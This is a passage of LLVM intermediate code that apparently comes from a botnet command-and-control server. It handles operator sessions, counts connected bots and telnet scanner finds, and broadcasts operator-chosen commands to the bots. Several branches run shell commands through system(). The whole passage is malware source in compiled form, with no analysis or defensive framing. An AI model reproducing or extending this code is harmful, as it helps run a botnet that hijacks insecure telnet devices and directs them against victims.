  %470 = call i64 @send(i32 %466, i8* %467, i64 %469, i32 16384)
  %471 = icmp eq i64 %470, -1
  br i1 %471, label %472, label %473

472:                                              ; preds = %465
  br label %1555

473:                                              ; preds = %465
  %474 = load i32, i32* %4, align 4
  %475 = getelementptr inbounds [5000 x i8], [5000 x i8]* %41, i64 0, i64 0
  %476 = getelementptr inbounds [5000 x i8], [5000 x i8]* %41, i64 0, i64 0
  %477 = call i64 @strlen(i8* %476) #8
  %478 = call i64 @send(i32 %474, i8* %475, i64 %477, i32 16384)
  %479 = icmp eq i64 %478, -1
  br i1 %479, label %480, label %481

480:                                              ; preds = %473
  br label %1555

481:                                              ; preds = %473
  %482 = load i32, i32* %4, align 4
  %483 = getelementptr inbounds [5000 x i8], [5000 x i8]* %42, i64 0, i64 0
  %484 = getelementptr inbounds [5000 x i8], [5000 x i8]* %42, i64 0, i64 0
  %485 = call i64 @strlen(i8* %484) #8
  %486 = call i64 @send(i32 %482, i8* %483, i64 %485, i32 16384)
  %487 = icmp eq i64 %486, -1
  br i1 %487, label %488, label %489

488:                                              ; preds = %481
  br label %1555

489:                                              ; preds = %481
  %490 = load i32, i32* %4, align 4
  %491 = getelementptr inbounds [5000 x i8], [5000 x i8]* %43, i64 0, i64 0
  %492 = getelementptr inbounds [5000 x i8], [5000 x i8]* %43, i64 0, i64 0
  %493 = call i64 @strlen(i8* %492) #8
  %494 = call i64 @send(i32 %490, i8* %491, i64 %493, i32 16384)
  %495 = icmp eq i64 %494, -1
  br i1 %495, label %496, label %497

496:                                              ; preds = %489
  br label %1555

497:                                              ; preds = %489
  %498 = load i32, i32* %4, align 4
  %499 = getelementptr inbounds [5000 x i8], [5000 x i8]* %44, i64 0, i64 0
  %500 = getelementptr inbounds [5000 x i8], [5000 x i8]* %44, i64 0, i64 0
  %501 = call i64 @strlen(i8* %500) #8
  %502 = call i64 @send(i32 %498, i8* %499, i64 %501, i32 16384)
  %503 = icmp eq i64 %502, -1
  br i1 %503, label %504, label %505

504:                                              ; preds = %497
  br label %1555

505:                                              ; preds = %497
  %506 = load i32, i32* %4, align 4
  %507 = getelementptr inbounds [5000 x i8], [5000 x i8]* %45, i64 0, i64 0
  %508 = getelementptr inbounds [5000 x i8], [5000 x i8]* %45, i64 0, i64 0
  %509 = call i64 @strlen(i8* %508) #8
  %510 = call i64 @send(i32 %506, i8* %507, i64 %509, i32 16384)
  %511 = icmp eq i64 %510, -1
  br i1 %511, label %512, label %513

512:                                              ; preds = %505
  br label %1555

513:                                              ; preds = %505
  %514 = load i32, i32* %4, align 4
  %515 = getelementptr inbounds [5000 x i8], [5000 x i8]* %46, i64 0, i64 0
  %516 = getelementptr inbounds [5000 x i8], [5000 x i8]* %46, i64 0, i64 0
  %517 = call i64 @strlen(i8* %516) #8
  %518 = call i64 @send(i32 %514, i8* %515, i64 %517, i32 16384)
  %519 = icmp eq i64 %518, -1
  br i1 %519, label %520, label %521

520:                                              ; preds = %513
  br label %1555

521:                                              ; preds = %513
  %522 = load i32, i32* %4, align 4
  %523 = getelementptr inbounds [5000 x i8], [5000 x i8]* %47, i64 0, i64 0
  %524 = getelementptr inbounds [5000 x i8], [5000 x i8]* %47, i64 0, i64 0
  %525 = call i64 @strlen(i8* %524) #8
  %526 = call i64 @send(i32 %522, i8* %523, i64 %525, i32 16384)
  %527 = icmp eq i64 %526, -1
  br i1 %527, label %528, label %529

528:                                              ; preds = %521
  br label %1555

529:                                              ; preds = %521
  %530 = load i32, i32* %4, align 4
  %531 = getelementptr inbounds [5000 x i8], [5000 x i8]* %48, i64 0, i64 0
  %532 = getelementptr inbounds [5000 x i8], [5000 x i8]* %48, i64 0, i64 0
  %533 = call i64 @strlen(i8* %532) #8
  %534 = call i64 @send(i32 %530, i8* %531, i64 %533, i32 16384)
  %535 = icmp eq i64 %534, -1
  br i1 %535, label %536, label %537

536:                                              ; preds = %529
  br label %1555

537:                                              ; preds = %529
  %538 = load i32, i32* %4, align 4
  %539 = getelementptr inbounds [5000 x i8], [5000 x i8]* %49, i64 0, i64 0
  %540 = getelementptr inbounds [5000 x i8], [5000 x i8]* %49, i64 0, i64 0
  %541 = call i64 @strlen(i8* %540) #8
  %542 = call i64 @send(i32 %538, i8* %539, i64 %541, i32 16384)
  %543 = icmp eq i64 %542, -1
  br i1 %543, label %544, label %545

544:                                              ; preds = %537
  br label %1555

545:                                              ; preds = %537
  %546 = load i32, i32* %4, align 4
  %547 = getelementptr inbounds [80 x i8], [80 x i8]* %50, i64 0, i64 0
  %548 = getelementptr inbounds [80 x i8], [80 x i8]* %50, i64 0, i64 0
  %549 = call i64 @strlen(i8* %548) #8
  %550 = call i64 @send(i32 %546, i8* %547, i64 %549, i32 16384)
  %551 = icmp eq i64 %550, -1
  br i1 %551, label %552, label %553

552:                                              ; preds = %545
  br label %1555

553:                                              ; preds = %545
  br label %554

554:                                              ; preds = %553
  %555 = load i32, i32* %4, align 4
  %556 = getelementptr inbounds [2048 x i8], [2048 x i8]* %53, i64 0, i64 0
  %557 = getelementptr inbounds [2048 x i8], [2048 x i8]* %53, i64 0, i64 0
  %558 = call i64 @strlen(i8* %557) #8
  %559 = call i64 @send(i32 %555, i8* %556, i64 %558, i32 16384)
  %560 = icmp eq i64 %559, -1
  br i1 %560, label %561, label %562

561:                                              ; preds = %554
  br label %1555

562:                                              ; preds = %554
  %563 = load i32, i32* %4, align 4
  %564 = call i64 @send(i32 %563, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.58, i64 0, i64 0), i64 12, i32 16384)
  %565 = icmp eq i64 %564, -1
  br i1 %565, label %566, label %567

566:                                              ; preds = %562
  br label %1555

567:                                              ; preds = %562
  br label %568

568:                                              ; preds = %567
  %569 = load i8*, i8** %3, align 8
  %570 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @TitleWriter, i8* %569) #9
  %571 = load i32, i32* %4, align 4
  %572 = sext i32 %571 to i64
  %573 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %572
  %574 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %573, i32 0, i32 0
  store i32 1, i32* %574, align 4
  br label %575

575:                                              ; preds = %1521, %1520, %1487, %1336, %1314, %1046, %1040, %1034, %1028, %1022, %1016, %1010, %1004, %998, %992, %986, %980, %974, %968, %962, %956, %950, %944, %939, %910, %893, %568
  %576 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %577 = load i32, i32* %4, align 4
  %578 = call i32 @fdgets(i8* %576, i32 2048, i32 %577)
  %579 = icmp sgt i32 %578, 0
  br i1 %579, label %580, label %1554

580:                                              ; preds = %575
  %581 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %582 = call i8* @strstr(i8* %581, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.59, i64 0, i64 0)) #8
  %583 = icmp ne i8* %582, null
  br i1 %583, label %584, label %877

584:                                              ; preds = %580
  %585 = getelementptr inbounds [2048 x i8], [2048 x i8]* %55, i64 0, i64 0
  %586 = call i32 (i8*, i8*, ...) @sprintf(i8* %585, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.60, i64 0, i64 0)) #9
  %587 = load i32, i32* %4, align 4
  %588 = getelementptr inbounds [2048 x i8], [2048 x i8]* %55, i64 0, i64 0
  %589 = getelementptr inbounds [2048 x i8], [2048 x i8]* %55, i64 0, i64 0
  %590 = call i64 @strlen(i8* %589) #8
  %591 = call i64 @send(i32 %587, i8* %588, i64 %590, i32 16384)
  %592 = icmp eq i64 %591, -1
  br i1 %592, label %593, label %594

593:                                              ; preds = %584
  br label %1555

594:                                              ; preds = %584
  br label %595

595:                                              ; preds = %873, %594
  %596 = getelementptr inbounds [2048 x i8], [2048 x i8]* %56, i64 0, i64 0
  %597 = call i32 (i8*, i8*, ...) @sprintf(i8* %596, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.61, i64 0, i64 0)) #9
  %598 = getelementptr inbounds [2048 x i8], [2048 x i8]* %62, i64 0, i64 0
  %599 = call i32 (i8*, i8*, ...) @sprintf(i8* %598, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.62, i64 0, i64 0)) #9
  %600 = getelementptr inbounds [2048 x i8], [2048 x i8]* %68, i64 0, i64 0
  %601 = call i32 (i8*, i8*, ...) @sprintf(i8* %600, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.63, i64 0, i64 0)) #9
  %602 = load i32, i32* %4, align 4
  %603 = getelementptr inbounds [2048 x i8], [2048 x i8]* %56, i64 0, i64 0
  %604 = getelementptr inbounds [2048 x i8], [2048 x i8]* %56, i64 0, i64 0
  %605 = call i64 @strlen(i8* %604) #8
  %606 = call i64 @send(i32 %602, i8* %603, i64 %605, i32 16384)
  %607 = icmp eq i64 %606, -1
  br i1 %607, label %608, label %609

608:                                              ; preds = %595
  br label %1555

609:                                              ; preds = %595
  %610 = load i32, i32* %4, align 4
  %611 = getelementptr inbounds [2048 x i8], [2048 x i8]* %62, i64 0, i64 0
  %612 = getelementptr inbounds [2048 x i8], [2048 x i8]* %62, i64 0, i64 0
  %613 = call i64 @strlen(i8* %612) #8
  %614 = call i64 @send(i32 %610, i8* %611, i64 %613, i32 16384)
  %615 = icmp eq i64 %614, -1
  br i1 %615, label %616, label %617

616:                                              ; preds = %609
  br label %1555

617:                                              ; preds = %609
  %618 = load i32, i32* %4, align 4
  %619 = getelementptr inbounds [2048 x i8], [2048 x i8]* %68, i64 0, i64 0
  %620 = getelementptr inbounds [2048 x i8], [2048 x i8]* %68, i64 0, i64 0
  %621 = call i64 @strlen(i8* %620) #8
  %622 = call i64 @send(i32 %618, i8* %619, i64 %621, i32 16384)
  %623 = icmp eq i64 %622, -1
  br i1 %623, label %624, label %625

624:                                              ; preds = %617
  br label %1555

625:                                              ; preds = %617
  %626 = call i32 (i8*, ...) @__isoc99_scanf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.64, i64 0, i64 0), i32* %54)
  %627 = load i32, i32* %54, align 4
  switch i32 %627, label %872 [
    i32 1, label %628
    i32 2, label %713
    i32 3, label %801
  ]

628:                                              ; preds = %625
  %629 = load i8, i8* %58, align 1
  %630 = sext i8 %629 to i64
  %631 = inttoptr i64 %630 to i8*
  %632 = call i32 (i8*, i8*, ...) @sprintf(i8* %631, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.65, i64 0, i64 0)) #9
  %633 = load i32, i32* %4, align 4
  %634 = load i8, i8* %58, align 1
  %635 = sext i8 %634 to i64
  %636 = inttoptr i64 %635 to i8*
  %637 = load i8, i8* %58, align 1
  %638 = sext i8 %637 to i64
  %639 = inttoptr i64 %638 to i8*
  %640 = call i64 @strlen(i8* %639) #8
  %641 = call i64 @send(i32 %633, i8* %636, i64 %640, i32 16384)
  %642 = icmp eq i64 %641, -1
  br i1 %642, label %643, label %644

643:                                              ; preds = %628
  br label %1555

644:                                              ; preds = %628
  %645 = call i32 (i8*, ...) @__isoc99_scanf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.64, i64 0, i64 0), i8* %58)
  %646 = load i8, i8* %59, align 1
  %647 = sext i8 %646 to i64
  %648 = inttoptr i64 %647 to i8*
  %649 = call i32 (i8*, i8*, ...) @sprintf(i8* %648, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.66, i64 0, i64 0)) #9
  %650 = load i32, i32* %4, align 4
  %651 = load i8, i8* %58, align 1
  %652 = sext i8 %651 to i64
  %653 = inttoptr i64 %652 to i8*
  %654 = load i8, i8* %58, align 1
  %655 = sext i8 %654 to i64
  %656 = inttoptr i64 %655 to i8*
  %657 = call i64 @strlen(i8* %656) #8
  %658 = call i64 @send(i32 %650, i8* %653, i64 %657, i32 16384)
  %659 = icmp eq i64 %658, -1
  br i1 %659, label %660, label %661

660:                                              ; preds = %644
  br label %1555

661:                                              ; preds = %644
  %662 = call i32 (i8*, ...) @__isoc99_scanf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.64, i64 0, i64 0), i8* %59)
  %663 = call i32 (i8*, i8*, ...) @sprintf(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.67, i64 0, i64 0), i8* %60) #9
  %664 = load i32, i32* %4, align 4
  %665 = load i8, i8* %60, align 1
  %666 = sext i8 %665 to i64
  %667 = inttoptr i64 %666 to i8*
  %668 = load i8, i8* %60, align 1
  %669 = sext i8 %668 to i64
  %670 = inttoptr i64 %669 to i8*
  %671 = call i64 @strlen(i8* %670) #8
  %672 = call i64 @send(i32 %664, i8* %667, i64 %671, i32 16384)
  %673 = icmp eq i64 %672, -1
  br i1 %673, label %674, label %675

674:                                              ; preds = %661
  br label %1555

675:                                              ; preds = %661
  %676 = call i32 (i8*, ...) @__isoc99_scanf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.64, i64 0, i64 0), i8* %60)
  %677 = load i8, i8* %61, align 1
  %678 = sext i8 %677 to i64
  %679 = inttoptr i64 %678 to i8*
  %680 = load i8, i8* %58, align 1
  %681 = sext i8 %680 to i32
  %682 = load i8, i8* %59, align 1
  %683 = sext i8 %682 to i32
  %684 = load i8, i8* %60, align 1
  %685 = sext i8 %684 to i32
  %686 = call i32 (i8*, i8*, ...) @sprintf(i8* %679, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.68, i64 0, i64 0), i32 %681, i32 %683, i32 %685) #9
  %687 = load i8, i8* %61, align 1
  %688 = sext i8 %687 to i64
  %689 = inttoptr i64 %688 to i8*
  %690 = load i32, i32* %4, align 4
  call void @broadcast(i8* %689, i32 %690, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.69, i64 0, i64 0))
  %691 = load i32, i32* %4, align 4
  %692 = load i8, i8* %61, align 1
  %693 = sext i8 %692 to i64
  %694 = inttoptr i64 %693 to i8*
  %695 = load i8, i8* %61, align 1
  %696 = sext i8 %695 to i64
  %697 = inttoptr i64 %696 to i8*
  %698 = call i64 @strlen(i8* %697) #8
  %699 = call i64 @send(i32 %691, i8* %694, i64 %698, i32 16384)
  %700 = icmp eq i64 %699, -1
  br i1 %700, label %701, label %702

701:                                              ; preds = %675
  br label %1555

702:                                              ; preds = %675
  %703 = getelementptr inbounds [2048 x i8], [2048 x i8]* %57, i64 0, i64 0
  %704 = call i32 (i8*, i8*, ...) @sprintf(i8* %703, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.70, i64 0, i64 0)) #9
  %705 = load i32, i32* %4, align 4
  %706 = getelementptr inbounds [2048 x i8], [2048 x i8]* %57, i64 0, i64 0
  %707 = getelementptr inbounds [2048 x i8], [2048 x i8]* %57, i64 0, i64 0
  %708 = call i64 @strlen(i8* %707) #8
  %709 = call i64 @send(i32 %705, i8* %706, i64 %708, i32 16384)
  %710 = icmp eq i64 %709, -1
  br i1 %710, label %711, label %712

711:                                              ; preds = %702
  br label %1555

712:                                              ; preds = %702
  br label %873

713:                                              ; preds = %625
  %714 = load i8, i8* %64, align 1
  %715 = sext i8 %714 to i64
  %716 = inttoptr i64 %715 to i8*
  %717 = call i32 (i8*, i8*, ...) @sprintf(i8* %716, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.65, i64 0, i64 0)) #9
  %718 = load i32, i32* %4, align 4
  %719 = load i8, i8* %64, align 1
  %720 = sext i8 %719 to i64
  %721 = inttoptr i64 %720 to i8*
  %722 = load i8, i8* %64, align 1
  %723 = sext i8 %722 to i64
  %724 = inttoptr i64 %723 to i8*
  %725 = call i64 @strlen(i8* %724) #8
  %726 = call i64 @send(i32 %718, i8* %721, i64 %725, i32 16384)
  %727 = icmp eq i64 %726, -1
  br i1 %727, label %728, label %729

728:                                              ; preds = %713
  br label %1555

729:                                              ; preds = %713
  %730 = call i32 (i8*, ...) @__isoc99_scanf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.64, i64 0, i64 0), i8* %64)
  %731 = load i8, i8* %65, align 1
  %732 = sext i8 %731 to i64
  %733 = inttoptr i64 %732 to i8*
  %734 = call i32 (i8*, i8*, ...) @sprintf(i8* %733, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.66, i64 0, i64 0)) #9
  %735 = load i32, i32* %4, align 4
  %736 = load i8, i8* %65, align 1
  %737 = sext i8 %736 to i64
  %738 = inttoptr i64 %737 to i8*
  %739 = load i8, i8* %65, align 1
  %740 = sext i8 %739 to i64
  %741 = inttoptr i64 %740 to i8*
  %742 = call i64 @strlen(i8* %741) #8
  %743 = call i64 @send(i32 %735, i8* %738, i64 %742, i32 16384)
  %744 = icmp eq i64 %743, -1
  br i1 %744, label %745, label %746

745:                                              ; preds = %729
  br label %1555

746:                                              ; preds = %729
  %747 = call i32 (i8*, ...) @__isoc99_scanf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.64, i64 0, i64 0), i8* %65)
  %748 = load i8, i8* %66, align 1
  %749 = sext i8 %748 to i64
  %750 = inttoptr i64 %749 to i8*
  %751 = call i32 (i8*, i8*, ...) @sprintf(i8* %750, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.67, i64 0, i64 0)) #9
  %752 = load i32, i32* %4, align 4
  %753 = load i8, i8* %66, align 1
  %754 = sext i8 %753 to i64
  %755 = inttoptr i64 %754 to i8*
  %756 = load i8, i8* %66, align 1
  %757 = sext i8 %756 to i64
  %758 = inttoptr i64 %757 to i8*
  %759 = call i64 @strlen(i8* %758) #8
  %760 = call i64 @send(i32 %752, i8* %755, i64 %759, i32 16384)
  %761 = icmp eq i64 %760, -1
  br i1 %761, label %762, label %763

762:                                              ; preds = %746
  br label %1555

763:                                              ; preds = %746
  %764 = call i32 (i8*, ...) @__isoc99_scanf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.64, i64 0, i64 0), i8* %66)
  %765 = load i8, i8* %67, align 1
  %766 = sext i8 %765 to i64
  %767 = inttoptr i64 %766 to i8*
  %768 = load i8, i8* %64, align 1
  %769 = sext i8 %768 to i32
  %770 = load i8, i8* %65, align 1
  %771 = sext i8 %770 to i32
  %772 = load i8, i8* %66, align 1
  %773 = sext i8 %772 to i32
  %774 = call i32 (i8*, i8*, ...) @sprintf(i8* %767, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.71, i64 0, i64 0), i32 %769, i32 %771, i32 %773) #9
  %775 = load i8, i8* %67, align 1
  %776 = sext i8 %775 to i64
  %777 = inttoptr i64 %776 to i8*
  %778 = load i32, i32* %4, align 4
  call void @broadcast(i8* %777, i32 %778, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.69, i64 0, i64 0))
  %779 = load i32, i32* %4, align 4
  %780 = load i8, i8* %67, align 1
  %781 = sext i8 %780 to i64
  %782 = inttoptr i64 %781 to i8*
  %783 = load i8, i8* %67, align 1
  %784 = sext i8 %783 to i64
  %785 = inttoptr i64 %784 to i8*
  %786 = call i64 @strlen(i8* %785) #8
  %787 = call i64 @send(i32 %779, i8* %782, i64 %786, i32 16384)
  %788 = icmp eq i64 %787, -1
  br i1 %788, label %789, label %790

789:                                              ; preds = %763
  br label %1555

790:                                              ; preds = %763
  %791 = getelementptr inbounds [2048 x i8], [2048 x i8]* %63, i64 0, i64 0
  %792 = call i32 (i8*, i8*, ...) @sprintf(i8* %791, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.72, i64 0, i64 0)) #9
  %793 = load i32, i32* %4, align 4
  %794 = getelementptr inbounds [2048 x i8], [2048 x i8]* %63, i64 0, i64 0
  %795 = getelementptr inbounds [2048 x i8], [2048 x i8]* %63, i64 0, i64 0
  %796 = call i64 @strlen(i8* %795) #8
  %797 = call i64 @send(i32 %793, i8* %794, i64 %796, i32 16384)
  %798 = icmp eq i64 %797, -1
  br i1 %798, label %799, label %800

799:                                              ; preds = %790
  br label %1555

800:                                              ; preds = %790
  br label %873

801:                                              ; preds = %625
  %802 = load i8, i8* %70, align 1
  %803 = sext i8 %802 to i64
  %804 = inttoptr i64 %803 to i8*
  %805 = call i32 (i8*, i8*, ...) @sprintf(i8* %804, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.65, i64 0, i64 0)) #9
  %806 = load i32, i32* %4, align 4
  %807 = load i8, i8* %70, align 1
  %808 = sext i8 %807 to i64
  %809 = inttoptr i64 %808 to i8*
  %810 = load i8, i8* %70, align 1
  %811 = sext i8 %810 to i64
  %812 = inttoptr i64 %811 to i8*
  %813 = call i64 @strlen(i8* %812) #8
  %814 = call i64 @send(i32 %806, i8* %809, i64 %813, i32 16384)
  %815 = icmp eq i64 %814, -1
  br i1 %815, label %816, label %817

816:                                              ; preds = %801
  br label %1555

817:                                              ; preds = %801
  %818 = call i32 (i8*, ...) @__isoc99_scanf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.64, i64 0, i64 0), i8* %70)
  %819 = load i8, i8* %71, align 1
  %820 = sext i8 %819 to i64
  %821 = inttoptr i64 %820 to i8*
  %822 = call i32 (i8*, i8*, ...) @sprintf(i8* %821, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.66, i64 0, i64 0)) #9
  %823 = load i32, i32* %4, align 4
  %824 = load i8, i8* %71, align 1
  %825 = sext i8 %824 to i64
  %826 = inttoptr i64 %825 to i8*
  %827 = load i8, i8* %65, align 1
  %828 = sext i8 %827 to i64
  %829 = inttoptr i64 %828 to i8*
  %830 = call i64 @strlen(i8* %829) #8
  %831 = call i64 @send(i32 %823, i8* %826, i64 %830, i32 16384)
  %832 = icmp eq i64 %831, -1
  br i1 %832, label %833, label %834

833:                                              ; preds = %817
  br label %1555

834:                                              ; preds = %817
  %835 = call i32 (i8*, ...) @__isoc99_scanf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.64, i64 0, i64 0), i8* %71)
  %836 = load i8, i8* %73, align 1
  %837 = sext i8 %836 to i64
  %838 = inttoptr i64 %837 to i8*
  %839 = load i8, i8* %70, align 1
  %840 = sext i8 %839 to i32
  %841 = load i8, i8* %71, align 1
  %842 = sext i8 %841 to i32
  %843 = load i8, i8* %72, align 1
  %844 = sext i8 %843 to i32
  %845 = call i32 (i8*, i8*, ...) @sprintf(i8* %838, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.73, i64 0, i64 0), i32 %840, i32 %842, i32 %844) #9
  %846 = load i8, i8* %73, align 1
  %847 = sext i8 %846 to i64
  %848 = inttoptr i64 %847 to i8*
  %849 = load i32, i32* %4, align 4
  call void @broadcast(i8* %848, i32 %849, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.69, i64 0, i64 0))
  %850 = load i32, i32* %4, align 4
  %851 = load i8, i8* %73, align 1
  %852 = sext i8 %851 to i64
  %853 = inttoptr i64 %852 to i8*
  %854 = load i8, i8* %73, align 1
  %855 = sext i8 %854 to i64
  %856 = inttoptr i64 %855 to i8*
  %857 = call i64 @strlen(i8* %856) #8
  %858 = call i64 @send(i32 %850, i8* %853, i64 %857, i32 16384)
  %859 = icmp eq i64 %858, -1
  br i1 %859, label %860, label %861

860:                                              ; preds = %834
  br label %1555

861:                                              ; preds = %834
  %862 = getelementptr inbounds [2048 x i8], [2048 x i8]* %69, i64 0, i64 0
  %863 = call i32 (i8*, i8*, ...) @sprintf(i8* %862, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.74, i64 0, i64 0)) #9
  %864 = load i32, i32* %4, align 4
  %865 = getelementptr inbounds [2048 x i8], [2048 x i8]* %69, i64 0, i64 0
  %866 = getelementptr inbounds [2048 x i8], [2048 x i8]* %69, i64 0, i64 0
  %867 = call i64 @strlen(i8* %866) #8
  %868 = call i64 @send(i32 %864, i8* %865, i64 %867, i32 16384)
  %869 = icmp eq i64 %868, -1
  br i1 %869, label %870, label %871

870:                                              ; preds = %861
  br label %1555

871:                                              ; preds = %861
  br label %873

872:                                              ; preds = %625
  br label %873

873:                                              ; preds = %872, %871, %800, %712
  %874 = load i32, i32* %54, align 4
  %875 = icmp ne i32 %874, 3
  br i1 %875, label %595, label %876, !llvm.loop !19

876:                                              ; preds = %873
  br label %877

877:                                              ; preds = %876, %580
  %878 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %879 = call i8* @strstr(i8* %878, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.75, i64 0, i64 0)) #8
  %880 = icmp ne i8* %879, null
  br i1 %880, label %881, label %894

881:                                              ; preds = %877
  %882 = getelementptr inbounds [2048 x i8], [2048 x i8]* %11, i64 0, i64 0
  %883 = call i32 @BotsConnected()
  %884 = load volatile i32, i32* @OperatorsConnected, align 4
  %885 = call i32 (i8*, i8*, ...) @sprintf(i8* %882, i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.76, i64 0, i64 0), i32 %883, i32 %884) #9
  %886 = load i32, i32* %4, align 4
  %887 = getelementptr inbounds [2048 x i8], [2048 x i8]* %11, i64 0, i64 0
  %888 = getelementptr inbounds [2048 x i8], [2048 x i8]* %11, i64 0, i64 0
  %889 = call i64 @strlen(i8* %888) #8
  %890 = call i64 @send(i32 %886, i8* %887, i64 %889, i32 16384)
  %891 = icmp eq i64 %890, -1
  br i1 %891, label %892, label %893

892:                                              ; preds = %881
  store i8* null, i8** %2, align 8
  br label %1564

893:                                              ; preds = %881
  br label %575, !llvm.loop !20

894:                                              ; preds = %877
  %895 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %896 = call i8* @strstr(i8* %895, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.77, i64 0, i64 0)) #8
  %897 = icmp ne i8* %896, null
  br i1 %897, label %898, label %911

898:                                              ; preds = %894
  %899 = getelementptr inbounds [2048 x i8], [2048 x i8]* %12, i64 0, i64 0
  %900 = load volatile i32, i32* @TELFound, align 4
  %901 = load volatile i32, i32* @scannerreport, align 4
  %902 = call i32 (i8*, i8*, ...) @sprintf(i8* %899, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.78, i64 0, i64 0), i32 %900, i32 %901) #9
  %903 = load i32, i32* %4, align 4
  %904 = getelementptr inbounds [2048 x i8], [2048 x i8]* %12, i64 0, i64 0
  %905 = getelementptr inbounds [2048 x i8], [2048 x i8]* %12, i64 0, i64 0
  %906 = call i64 @strlen(i8* %905) #8
  %907 = call i64 @send(i32 %903, i8* %904, i64 %906, i32 16384)
  %908 = icmp eq i64 %907, -1
  br i1 %908, label %909, label %910

909:                                              ; preds = %898
  store i8* null, i8** %2, align 8
  br label %1564

910:                                              ; preds = %898
  br label %575, !llvm.loop !20

911:                                              ; preds = %894
  %912 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %913 = call i8* @strstr(i8* %912, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.79, i64 0, i64 0)) #8
  %914 = icmp ne i8* %913, null
  br i1 %914, label %915, label %940

915:                                              ; preds = %911
  %916 = getelementptr inbounds [2048 x i8], [2048 x i8]* %11, i64 0, i64 0
  %917 = call i32 @BotsConnected()
  %918 = load volatile i32, i32* @OperatorsConnected, align 4
  %919 = call i32 (i8*, i8*, ...) @sprintf(i8* %916, i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.76, i64 0, i64 0), i32 %917, i32 %918) #9
  %920 = load i32, i32* %4, align 4
  %921 = getelementptr inbounds [2048 x i8], [2048 x i8]* %11, i64 0, i64 0
  %922 = getelementptr inbounds [2048 x i8], [2048 x i8]* %11, i64 0, i64 0
  %923 = call i64 @strlen(i8* %922) #8
  %924 = call i64 @send(i32 %920, i8* %921, i64 %923, i32 16384)
  %925 = icmp eq i64 %924, -1
  br i1 %925, label %926, label %927

926:                                              ; preds = %915
  store i8* null, i8** %2, align 8
  br label %1564

927:                                              ; preds = %915
  %928 = getelementptr inbounds [2048 x i8], [2048 x i8]* %12, i64 0, i64 0
  %929 = load volatile i32, i32* @TELFound, align 4
  %930 = load volatile i32, i32* @scannerreport, align 4
  %931 = call i32 (i8*, i8*, ...) @sprintf(i8* %928, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.78, i64 0, i64 0), i32 %929, i32 %930) #9
  %932 = load i32, i32* %4, align 4
  %933 = getelementptr inbounds [2048 x i8], [2048 x i8]* %12, i64 0, i64 0
  %934 = getelementptr inbounds [2048 x i8], [2048 x i8]* %12, i64 0, i64 0
  %935 = call i64 @strlen(i8* %934) #8
  %936 = call i64 @send(i32 %932, i8* %933, i64 %935, i32 16384)
  %937 = icmp eq i64 %936, -1
  br i1 %937, label %938, label %939

938:                                              ; preds = %927
  store i8* null, i8** %2, align 8
  br label %1564

939:                                              ; preds = %927
  br label %575, !llvm.loop !20

940:                                              ; preds = %911
  %941 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %942 = call i8* @strstr(i8* %941, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.80, i64 0, i64 0)) #8
  %943 = icmp ne i8* %942, null
  br i1 %943, label %944, label %946

944:                                              ; preds = %940
  %945 = call i32 @system(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.81, i64 0, i64 0))
  br label %575, !llvm.loop !20

946:                                              ; preds = %940
  %947 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %948 = call i8* @strstr(i8* %947, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.82, i64 0, i64 0)) #8
  %949 = icmp ne i8* %948, null
  br i1 %949, label %950, label %952

950:                                              ; preds = %946
  %951 = call i32 @system(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.83, i64 0, i64 0))
  br label %575, !llvm.loop !20

